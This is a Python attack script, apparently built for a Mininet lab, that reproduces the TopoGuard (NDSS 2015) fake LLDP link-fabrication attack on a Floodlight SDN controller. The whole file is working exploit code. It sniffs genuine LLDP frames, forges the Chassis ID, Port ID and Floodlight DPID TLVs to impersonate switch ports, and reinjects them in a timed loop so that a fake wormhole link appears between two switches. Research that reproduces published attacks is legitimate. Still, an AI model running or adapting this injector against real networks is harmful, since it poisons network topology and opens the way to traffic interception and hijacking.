#!/usr/bin/env python3
"""
fake_lldp_inject.py — Fake LLDP Injector for Link Fabrication Attack

Implements the Fake LLDP Injection attack described in:
"Poisoning Network Visibility in Software-Defined Networks:
 New Attacks and Countermeasures" (TopoGuard, NDSS 2015), Section III.C

Attack Steps (per paper):
  1. Monitor switch port traffic to capture a genuine LLDP packet
     sent by the Floodlight controller via Packet-Out.
  2. Modify the DPID (Chassis ID TLV) and port number (Port ID TLV)
     fields to impersonate a different switch port.
  3. Inject the forged packet back into the network.
  4. Repeat at the same rate as the controller's LLDP probing
     to keep the fake link alive in the Link Discovery Service.

Verified LLDP TLV layout (from captured Floodlight packets):
  TLV 1   Chassis ID  : type=1,   len=7  → subtype(1) + DPID_lower_6_bytes(6)
  TLV 2   Port ID     : type=2,   len=3  → subtype(1) + port_2bytes(2)
  TLV 3   TTL         : type=3,   len=2  → 0x0078 = 120s  [unchanged]
  TLV 127 Org-Spec #1 : type=127, len=12 → OUI(3)+sub=0(1)+DPID_8bytes(8)
  TLV 12  Switch Nonce: type=12,  len=8  → nonce bytes       [unchanged]
  TLV 115 Internal Flg: type=115, len=1  → flag byte         [unchanged]
  TLV 127 Org-Spec #2 : type=127, len=12 → OUI(3)+sub=1(1)+probe_counter(8) [unchanged]
  TLV 0   End

Abilene Topology — Wormhole between s4 (Seattle, DPID=4) and s8 (Kansas City, DPID=8)
─────────────────────────────────────────────────────────────────────────────────────────
Port layout (derived from Abilene.json edge order + EXTRA_HOSTS order in abilene.py):

  s4 port 1 : s5 (Sunnyvale)       s8 port 1 : s7 (Denver)
  s4 port 2 : s7 (Denver)          s8 port 2 : s9 (Houston)
  s4 port 3 : h4 (std host)        s8 port 3 : s11 (Indianapolis)
  s4 port 4 : ha (extra host)      s8 port 4 : h8 (std host)
  s4 port 5 : a1 (attacker)        s8 port 5 : hb (extra host)
                                   s8 port 6 : a2 (attacker)

Goal: make Floodlight believe there is a direct link s4:5 ↔ s8:6

Usage (from Mininet xterms or with mnexec):
  a1:  sudo python3 fake_lldp_inject.py --iface a1-eth0 --spoof-dpid 8 --spoof-port 6
  a2:  sudo python3 fake_lldp_inject.py --iface a2-eth0 --spoof-dpid 4 --spoof-port 5

  a1 is on s4 port 5 — it injects LLDP claiming to be s8 port 6
  a2 is on s8 port 6 — it injects LLDP claiming to be s4 port 5

Result:
  Floodlight's Link Discovery Service registers fake link: s4:5 ↔ s8:6
  Verify: curl http://localhost:8080/wm/topology/links/json | python3 -m json.tool
"""

import argparse
import struct
import time

from scapy.all import Ether, sendp, sniff

# ── Constants ─────────────────────────────────────────────────────────────────

ETH_HDR_LEN         = 14               # dst_mac(6) + src_mac(6) + ethertype(2)

# Floodlight Org-Specific TLV — OUI: Big Switch Networks (00:26:e1)
# Subtype 0x00 carries the full 8-byte DPID of the sending switch.
# Paper: "the authenticator keeps unchanged after the setup of Floodlight
#         controllers, which allows an adversary to violate the origin property."
FLOODLIGHT_OUI      = b'\x00\x26\xe1'
FLOODLIGHT_SUB_DPID = 0x00

# Injection interval tuned to Floodlight's default LLDP probe rate (~15s).
# Paper: "the adversary could tune the LLDP injecting rate to the LLDP
#         sending rate monitored from the OpenFlow controller."
DEFAULT_INTERVAL      = 5      # seconds between injections
DEFAULT_REFRESH_EVERY = 6       # re-sniff every N injections (~every 30s)
SNIFF_TIMEOUT         = 30      # seconds to wait for a genuine LLDP frame


# ── LLDP helpers ──────────────────────────────────────────────────────────────

def sniff_real_lldp(iface: str) -> bytes:
    """
    Capture one genuine LLDP Packet-Out from Floodlight on *iface*.

    Paper: "By monitoring the traffic from OpenFlow switches, the adversary
    can obtain the genuine LLDP packet."
    """
    print(f"[*] Sniffing for genuine LLDP on {iface} (timeout={SNIFF_TIMEOUT}s)...")
    pkts = sniff(
        iface=iface,
        filter="ether proto 0x88cc",
        count=1,
        timeout=SNIFF_TIMEOUT,
    )
    if not pkts:
        raise RuntimeError(
            f"No LLDP received on {iface} within {SNIFF_TIMEOUT}s.\n"
            "  -> Is Floodlight running?  Is the Mininet topology up?"
        )
    raw = bytes(pkts[0])
    print(f"[+] Captured genuine LLDP frame ({len(raw)} bytes)")
    return raw


def _parse_tlvs(lldp_payload: bytes):
    """
    Walk the LLDP TLV chain and yield (tlv_type, value_offset, value_bytes).

    value_offset is the byte index inside lldp_payload where the TLV value
    begins (after the 2-byte type+length header).
    """
    offset = 0
    while offset + 2 <= len(lldp_payload):
        hdr        = struct.unpack_from("!H", lldp_payload, offset)[0]
        tlv_type   = hdr >> 9
        tlv_len    = hdr & 0x1FF
        val_offset = offset + 2
        val_bytes  = lldp_payload[val_offset : val_offset + tlv_len]
        yield tlv_type, val_offset, val_bytes
        if tlv_type == 0:       # End of LLDPDU
            break
        offset += 2 + tlv_len


def forge_lldp(raw_frame: bytes, spoof_dpid: int, spoof_port: int) -> bytes:
    """
    Forge an LLDP frame per TopoGuard NDSS 2015, Section III.C.

    Verified from captured Floodlight LLDP packets:

      TLV 1 (Chassis ID) — value layout: [subtype(1)][dpid_lower_6(6)] = 7 bytes
        → overwrite bytes [vo+1 : vo+7] with lower 6 bytes of spoofed DPID

      TLV 2 (Port ID) — value layout: [subtype(1)][port(2)] = 3 bytes
        → overwrite bytes [vo+1 : vo+3] with 2-byte big-endian port number
        NOTE: Port is 2 bytes in Floodlight's LLDP (confirmed from packet capture).
              Writing more than 2 bytes would overflow into the next TLV.

      TLV 127 subtype=0 (Org-Specific DPID) — value: [OUI(3)][sub(1)][dpid_8(8)]
        → overwrite bytes [vo+4 : vo+12] with full 8-byte spoofed DPID

    All other TLVs (TTL, Switch Nonce type=12, Internal Flag type=115,
    Probe Counter TLV127/sub=1, End) are preserved byte-for-byte.
    The static switch nonce passes Floodlight's authenticator check unchanged.
    """
    eth_hdr      = raw_frame[:ETH_HDR_LEN]
    lldp_payload = bytearray(raw_frame[ETH_HDR_LEN:])

    # Encode spoofed identity values
    # Chassis ID: lower 6 bytes of the 64-bit DPID (bytes [2..7] of 8-byte big-endian)
    dpid_6 = struct.pack("!Q", spoof_dpid)[2:]
    # Port ID: 2-byte big-endian (confirmed from packet: TLV2 value len=3 = subtype+2bytes)
    port_2 = struct.pack("!H", spoof_port)
    # Org-Specific DPID: full 8-byte DPID
    dpid_8 = struct.pack("!Q", spoof_dpid)

    for tlv_type, vo, val_bytes in _parse_tlvs(bytes(lldp_payload)):

        # ── TLV 1: Chassis ID ────────────────────────────────────────────────
        # Confirmed layout: subtype(1=0x04) + dpid_lower_6(6) → total 7 bytes
        # Modify only the 6 DPID bytes; preserve subtype byte at vo+0
        if tlv_type == 1:
            lldp_payload[vo + 1 : vo + 7] = dpid_6
            print(f"    [TLV  1] Chassis ID  -> DPID {spoof_dpid} "
                  f"({dpid_6.hex(' ')})")

        # ── TLV 2: Port ID ───────────────────────────────────────────────────
        # Confirmed layout: subtype(1=0x02) + port(2) → total 3 bytes
        # Port is 2 bytes (not 4) — verified from captured packet (len=3)
        # Modify only the 2 port bytes; preserve subtype byte at vo+0
        elif tlv_type == 2:
            lldp_payload[vo + 1 : vo + 3] = port_2
            print(f"    [TLV  2] Port ID     -> port {spoof_port} "
                  f"({port_2.hex(' ')})")

        # ── TLV 127 subtype=0: Org-Specific DPID (Floodlight OUI) ───────────
        # Confirmed layout: OUI(3=00:26:e1) + subtype(1=0x00) + dpid_8(8) → 12 bytes
        # Modify only the 8 DPID bytes; preserve OUI+subtype at vo+0..vo+3
        elif tlv_type == 127 and len(val_bytes) >= 12:
            oui     = bytes(val_bytes[0:3])
            subtype = val_bytes[3]
            if oui == FLOODLIGHT_OUI and subtype == FLOODLIGHT_SUB_DPID:
                lldp_payload[vo + 4 : vo + 12] = dpid_8
                print(f"    [TLV127] Org-Spec   -> DPID {spoof_dpid} "
                      f"({dpid_8.hex(' ')})")

        # TLV 3  (TTL=120s)         → unchanged
        # TLV 12 (Switch Nonce)     → unchanged  (static authenticator per paper)
        # TLV 115 (Internal Flag)   → unchanged
        # TLV 127/sub=1 (Probe Ctr) → refreshed by periodic re-sniff
        # TLV 0  (End)              → unchanged

    return bytes(eth_hdr) + bytes(lldp_payload)


# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description=(
            "Link Fabrication via Fake LLDP Injection.\n"
            "Reproduces the attack in TopoGuard (NDSS 2015), Section III.C."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--iface",
                        required=True,
                        help="Interface to sniff and inject on (e.g. a1-eth0)")
    parser.add_argument("--spoof-dpid",
                        required=True, type=int,
                        help="DPID of the switch to impersonate (e.g. 3 for s3)")
    parser.add_argument("--spoof-port",
                        required=True, type=int,
                        help="Port number of the switch to impersonate (e.g. 4)")
    parser.add_argument("--interval",
                        type=float, default=DEFAULT_INTERVAL,
                        help=f"Seconds between injections — tune to match "
                             f"Floodlight LLDP probe rate (default: {DEFAULT_INTERVAL}s)")
    parser.add_argument("--refresh-every",
                        type=int, default=DEFAULT_REFRESH_EVERY,
                        help=f"Re-sniff genuine LLDP every N injections to keep "
                             f"probe counter current (default: {DEFAULT_REFRESH_EVERY})")
    args = parser.parse_args()

    print(f"""
+----------------------------------------------------------+
|      Fake LLDP Injector -- Link Fabrication Attack       |
|      TopoGuard NDSS 2015, Section III.C                  |
|      Abilene topology: s4 (DPID=4) <-> s8 (DPID=8)      |
+----------------------------------------------------------+
|  Interface  : {args.iface:<43}|
|  Spoof DPID : s{args.spoof_dpid} (DPID={args.spoof_dpid}){'':<35}|
|  Spoof Port : {args.spoof_port:<43}|
|  Interval   : {str(args.interval) + 's':<43}|
|                                                          |
|  a1-eth0: --spoof-dpid 8 --spoof-port 6                 |
|           (a1 on s4:5, claims to be s8:6)               |
|  a2-eth0: --spoof-dpid 4 --spoof-port 5                 |
|           (a2 on s8:6, claims to be s4:5)               |
+----------------------------------------------------------+
""")

    # Step 1 — capture genuine LLDP
    # Paper: "By monitoring the traffic from OpenFlow switches, the adversary
    #         can obtain the genuine LLDP packet."
    raw_frame = sniff_real_lldp(args.iface)

    # Step 2 — forge identity fields
    # Paper: "he/she can modify the specific contents of the LLDP packet,
    #         e.g., the DPID field or the port number field"
    print("\n[*] Forging LLDP TLVs:")
    forged_frame = forge_lldp(raw_frame, args.spoof_dpid, args.spoof_port)
    pkt = Ether(forged_frame)

    # Step 3 — inject in a loop at the controller's probe rate
    # Paper: "the adversary could tune the LLDP injecting rate to the LLDP
    #         sending rate monitored from the OpenFlow controller"
    # #
    # # Add an artificial delay before re-injection so the fake link's measured
    # # LLDP RTT approximates the real inter-switch link latency (≈ BASE_DELAY_MS
    # # in abilene.py). Without this, fake-link RTT is ~1–5 ms while real links
    # # are ~50 ms, which distorts Floodlight's latency-weighted routing.
    # FAKE_LINK_DELAY = 0.025   # seconds; match BASE_DELAY_MS in abilene.py
    # print(f"\n[*] Injecting forged LLDP every {args.interval}s "
    #       f"(+{int(FAKE_LINK_DELAY*1000)}ms artificial latency)  (Ctrl+C to stop)\n")
    count = 0
    try:
        while True:
            # time.sleep(FAKE_LINK_DELAY)
            sendp(pkt, iface=args.iface, verbose=False)
            count += 1
            print(f"    [->] Packets injected: {count}", end="\r", flush=True)

            # Periodically re-sniff to keep probe counter TLV (TLV127/sub=1) current
            if count % args.refresh_every == 0:
                print(f"\n[*] Re-sniffing genuine LLDP "
                      f"(refresh #{count // args.refresh_every})...")
                raw_frame    = sniff_real_lldp(args.iface)
                print("[*] Re-forging TLVs:")
                forged_frame = forge_lldp(raw_frame, args.spoof_dpid, args.spoof_port)
                pkt          = Ether(forged_frame)
                print("[*] Resuming injection...\n")

            time.sleep(args.interval)

    except KeyboardInterrupt:
        print(f"\n\n[!] Stopped.  Total packets injected: {count}")
        print("\n[*] Verify fake link:")
        print("    curl http://localhost:8080/wm/topology/links/json"
              " | python3 -m json.tool")


if __name__ == "__main__":
    main()
